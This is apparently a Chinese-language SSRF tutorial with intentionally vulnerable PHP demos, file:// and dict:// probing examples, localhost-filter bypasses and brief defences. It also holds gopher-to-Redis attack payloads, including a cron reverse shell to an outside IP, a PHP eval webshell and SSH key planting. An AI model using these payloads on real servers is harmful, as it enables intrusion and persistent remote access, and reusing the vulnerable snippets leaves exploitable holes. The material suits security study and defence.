# SSRF

>SSRF (Server-Side Request Forgery:服务请求伪造)，指构造payload攻击脚本诱导服务器发起请求，使服务器执行非本意操作，常用于内网服务的攻击

**0x01 与CSRF区别**

- CSRF是跨站请求伪造漏洞,是诱导用户点击，欺骗的是客户端，SSRF是诱导服务器访问，欺骗服务器

## 0x02 漏洞原理

**file_get_contents**

- 将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户 

```php
<?php
highlight_file("demo1.php");
error_reporting(0);
//ssrf -> file_get_contents
//file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户
$url = $_GET['url'];;
echo file_get_contents($url);
?> 
```

**fsockopen**

- 打开一个网络连接或者一个Unix 套接字连接，实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 

```php
<?php
highlight_file("demo2.php");
error_reporting(0);
//ssrf -> fsockopen
//fsockopen用于打开一个网络连接或者一个Unix 套接字连接，实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。
$host=$_GET['url'];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?> 
```

**curl_exec**

- 对远程的url发起请求

```php
<?php 
highlight_file("demo3.php");
error_reporting(0);
//ssrf -> curl_exec
//前端传进来的url使用 curl_exec()进行了请求，然后将请求的结果返回给了前端
if (isset($_GET['url'])){
    $link = $_GET['url'];
    $curlobj = curl_init(); // 创建新的 cURL 资源
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项
    $result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器
    curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源
 
    // $filename = './curled/'.rand().'.txt';
    // file_put_contents($filename, $result); 
    echo $result;
}
?> 
```

## 0x03 漏洞挖掘

**白盒**

- 找上述三个函数

**黑盒**

- 看网站请求消息中有没有url存在，如果有就改成payload测试，比如改成DNSlog平台提供的url,看是否有访问记录

## 0x04 漏洞利用

**读取敏感文件**

- 利用伪协议读取本地文件
  - file:///etc/passwd
  - file://c:/windows/win.ini

**内网服务探测**

  - dict://127.0.0.1:3306 (Mysql)
  - dict://127.0.0.1:22 (SSH)
  - dict://127.0.0.1:6379 (Redis)
  - dict://127.0.0.1:1433 (SqlServer)

**内网服务攻击**

  - gopher ★（可以发送任意TCP数据，默认端口70）
    - gopher://127.0.0.1/_+TCP数据包
      1. 开启监听nc -lvvp 70
      2. curl gopher://127.0.0.1/_testdata

- gopher发起请求的方式
      1. 构造HTTP的请求消息
      2. 对请求消息进行url编码
      3. 把编码后的%0A替换成%0D%0A
      4. 将替换后的数据再一次进行url编码
      5. 拼接协议头gopher://ip/_testdata

**gopher攻击Redis**

- 先检测Redis是否存在

  -  dict:/192.168.10.11:6379
     -  dict://192.168.10.11:6379/info
     -  dict://192.168.10.11:6379/ping

- 写计划任务 (可以利用[Gopherus](https://github.com/tarunkant/Gopherus)工具生成payload)

  ```shell
  flush set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.10.11/4567 0>&1\n\n' config set dir 
  ```

- Redis写webshell (可以利用[Gopherus](https://github.com/tarunkant/Gopherus)工具生成payload)

  ```shell
  flushall
  set 1 '<?php eval($_GET["cmd"]);?>'
  config set dir /var/www/html
  config set dbfilename shell.php
  save
  ```

- Redistribution写ssh公钥

  - [redis-ssrf](https://github.com/xmsec/redis-ssrf)

  ```shell
  flushal
  set 1 '生成的RSA公钥'
  config set dir /root/.ssh/
  config set dbfilename authorized_keys
  save
  ```

  - 1. 生成公私钥对（创造锁和钥匙），这个命令在任何的机器上执行都可以，不一定非要在本机

    - ssh keygen
    - id_rsa (私钥，钥匙)
    - id_rsa.pub (公钥，锁)

  - 2. 把公钥写在linux主机用户目录.ssh/authorized_keys （上锁）

  - 3. 使用私钥登录ssh

    - ssh user@ip -i id_rsa

## 0x05 漏洞绕过

- 利用特殊字符或改写绕过url限制
  - http://127。0。0。1/
  - http://127.1/
  - http://127. 0.0.1./
  - http://[::]:80/
  - http://0x7f.0.0.1/

## 0x06 漏洞防御

- 过滤除http和https以外的所有协议头（白名单协议头必须是http或https）
- 设置url白名单或黑名单（比如百度翻译不允许访问dnslog和bbc）
- 不允许访问内网资源，或不允许访问ip（比如不允许访问localhost）

[其他资料](https://xz.aliyun.com/t/2115)